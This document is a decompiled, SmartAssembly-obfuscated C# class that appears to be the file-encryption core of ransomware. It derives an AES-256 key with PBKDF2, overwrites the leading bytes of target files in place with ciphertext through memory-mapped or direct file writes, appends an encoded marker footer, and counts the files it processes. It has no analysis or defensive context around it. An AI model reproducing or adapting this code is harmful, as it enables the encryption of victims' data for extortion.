using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

public static class fkozHCDTDrY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] GVHcoGquozRzL(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = XPUhWjxaPSvB(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes XPUhWjxaPSvB(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] OlBXyEPnCYpDO(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (PFruJiQrcriiZ.POXokwFKrkkHxdVH == getString_0(107396903))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (PFruJiQrcriiZ.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, getString_0(107386548) + string_0 + getString_0(107401313) + ex.Message + getString_0(107396336));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool wXhdORmUgbGuB(string ZsIFKCtaED, byte[] quwoLGzcjeGYg, byte[] TTsauZziAEbN = null)
	{
		try
		{
			byte[] array = null;
			if (PFruJiQrcriiZ.POXokwFKrkkHxdVH == getString_0(107396903))
			{
				array = (PFruJiQrcriiZ.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401255))) : Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401296))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ZsIFKCtaED, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PFruJiQrcriiZ.IooTTsvIiwCN)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (PFruJiQrcriiZ.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401255))) : Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401296))));
				FileStream fileStream2 = new FileStream(ZsIFKCtaED, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PFruJiQrcriiZ.IooTTsvIiwCN)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			PFruJiQrcriiZ.XnicJWCgBOO++;
		}
		catch (Exception ex)
		{
			if (PFruJiQrcriiZ.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, getString_0(107386548) + ZsIFKCtaED + getString_0(107401246) + ex.Message + getString_0(107396336));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (PFruJiQrcriiZ.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401255))) : Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401296))));
				FileStream fileStream4 = new FileStream(ZsIFKCtaED, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!PFruJiQrcriiZ.IooTTsvIiwCN)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static fkozHCDTDrY()
	{
		Strings.CreateGetStringDelegate(typeof(fkozHCDTDrY));
	}
}
